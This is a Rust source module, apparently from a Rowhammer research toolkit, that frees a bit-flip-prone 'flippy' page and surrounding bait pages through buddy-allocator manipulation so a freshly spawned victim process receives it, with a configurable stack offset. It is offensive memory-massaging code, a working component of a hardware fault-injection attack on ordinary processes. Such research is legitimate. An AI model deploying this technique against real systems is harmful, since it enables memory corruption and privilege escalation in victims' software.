//! Page injection utilities for controlled memory placement.
//!
//! This module provides facilities for injecting pages using buddy
//! allocator manipulation. This is useful for placing victim pages at
//! known locations relative to aggressor pages.

use crate::memory::PfnResolver;
use crate::util::{PAGE_MASK, PAGE_SIZE};
use crate::util::{mmap, munmap};
use log::{debug, info};
use serde::Serialize;
use std::{
    process::{Child, Command},
    ptr::null_mut,
};

/// Configuration for page injection operations.
#[derive(Copy, Clone, Debug, Serialize)]
pub struct InjectionConfig {
    /// An identifier for this injection configuration
    pub id: usize,
    /// The target physical address for page injection
    pub target_addr: usize,
    /// Size of the flippy page in bytes
    pub flippy_page_size: usize,
    /// Number of bait pages to release after the flippy page
    pub bait_count_after: usize,
    /// Number of bait pages to release before the flippy page
    pub bait_count_before: usize,
    /// Expected stack offset for injection
    pub stack_offset: usize,
}

/// Trait for page injection strategies.
///
/// Implementors provide methods to inject a page.
pub trait PageInjector<T> {
    /// The type of error that can be produced by the injector
    type Error;
    /// Performs the page injection operation.
    ///
    /// # Errors
    ///
    /// Returns an I/O error if injection fails.
    fn inject(&mut self) -> Result<T, Self::Error>;
}

/// Page injector using Linux buddy allocator manipulation.
///
/// Uses a helper process to manipulate the buddy allocator and inject
/// pages at specific physical addresses.
#[derive(Debug)]
pub struct BuddyPageInjector {
    cmd: Option<Command>,
    injection_config: InjectionConfig,
}

impl BuddyPageInjector {
    /// Creates a new buddy page injector.
    ///
    /// # Arguments
    ///
    /// * `cmd` - Command to execute for injection
    /// * `injection_config` - Configuration for the injection operation
    pub fn new(cmd: Command, injection_config: InjectionConfig) -> Self {
        Self {
            cmd: Some(cmd),
            injection_config,
        }
    }
}

impl PageInjector<Child> for BuddyPageInjector {
    type Error = std::io::Error;

    fn inject(&mut self) -> Result<Child, Self::Error> {
        let target_page = (self.injection_config.target_addr & !PAGE_MASK) as *mut libc::c_void;
        debug!(
            "Injecting target page {:p}, phys {:p}, into victim process {}",
            target_page,
            target_page.pfn().unwrap_or_default(),
            self.cmd.as_ref().unwrap().get_program().to_str().unwrap()
        );
        let bait: *mut libc::c_void = if self.injection_config.bait_count_before
            + self.injection_config.bait_count_after
            != 0
        {
            mmap(
                null_mut(),
                (self.injection_config.bait_count_before + self.injection_config.bait_count_after)
                    * PAGE_SIZE,
            )
        } else {
            null_mut()
        };

        info!("deallocating bait");
        unsafe {
            if self.injection_config.bait_count_before != 0 {
                munmap(bait, self.injection_config.bait_count_before * PAGE_SIZE);
            }
            munmap(target_page, self.injection_config.flippy_page_size);
            if self.injection_config.bait_count_after != 0 {
                munmap(
                    bait.byte_add(self.injection_config.bait_count_before * PAGE_SIZE),
                    self.injection_config.bait_count_after * PAGE_SIZE,
                );
            }
        }
        // spawn
        //info!("Launching victim");
        self.cmd.take().expect("No cmd").spawn()
    }
}
